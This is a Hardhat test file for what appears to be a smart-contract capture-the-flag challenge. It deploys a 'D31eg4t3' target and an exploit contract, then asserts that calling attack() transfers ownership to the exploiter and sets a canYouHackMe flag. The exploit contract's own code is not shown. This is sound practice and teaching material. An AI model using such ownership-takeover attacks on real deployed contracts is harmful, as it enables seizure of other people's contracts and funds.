const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exploit D31eg4t3 Contract", function () {
    before(async () => {
        // deploying the target contract
        const D31eg4t3 = await ethers.getContractFactory("D31eg4t3");
        target = await D31eg4t3.deploy();
        accounts = await ethers.getSigners();
        [owner, exploiter] = accounts;
    })
    it("Deploy the exploit contract", async () => {
        const Exploit = await ethers.getContractFactory("ExploitD31eg4t3");
        exploit_contract = await Exploit.connect(exploiter).deploy(target.address);
        expect(exploit_contract.address).to.not.equal(ethers.constants.AddressZero);
    })
    it("Exploiter calls the attack() function and takes control of the contract", async () => {
        const oldOwner = await target.owner();
        expect(oldOwner).to.equal(owner.address)
        await exploit_contract.connect(exploiter).attack();
        const newOwner = await target.owner();
        expect(newOwner).to.equal(exploiter.address)
    })
    it("Make sure the canYouHackMe mapping is updated", async () => {
        const canYouHackMeOutput = await target.canYouHackMe(exploiter.address);
        expect(canYouHackMeOutput).to.equal(true);
    })
});
